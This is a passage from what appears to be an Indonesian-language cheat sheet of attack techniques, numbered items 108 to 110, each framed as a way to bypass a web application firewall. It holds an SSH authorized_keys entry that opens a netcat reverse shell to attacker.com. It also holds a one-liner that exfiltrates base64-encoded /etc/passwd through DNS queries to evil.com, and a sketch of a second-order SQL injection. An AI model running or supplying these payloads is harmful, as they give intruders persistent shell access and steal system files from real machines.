echo 'command="nc -e /bin/sh attacker.com 4444" ssh-rsa AAA...' >> ~/.ssh/authorized_keys
```
**📌 Teknik:**  
✅ **SSH Key Injection** = Memasukkan perintah dalam file `authorized_keys`.  
✅ **Bypass WAF** karena terjadi di level sistem, bukan aplikasi web.  

---

### **🛡️ 109. Data Exfiltration via DNS Queries**  
```bash
nslookup $(cat /etc/passwd | base64).evil.com
```
**📌 Teknik:**  
✅ **DNS Exfiltration** = Mengirimkan data melalui query DNS.  
✅ **Bypass WAF** karena traffic DNS sering tidak dimonitor secara ketat.  

---

### **🛡️ 110. Advanced SQL Injection via Second-Order Attack**  
```sql
INSERT INTO users (username) VALUES ('admin'); -- Kemudian diakses:  
SELECT * FROM users WHERE username='$input'
```
**📌 Teknik:**  
✅ **Second-Order SQLi** = Mengeksploitasi data yang sudah tersimpan sebelumnya.  
✅ **Bypass WAF** karena payload tidak langsung terlihat berbahaya saat disimpan.  

---
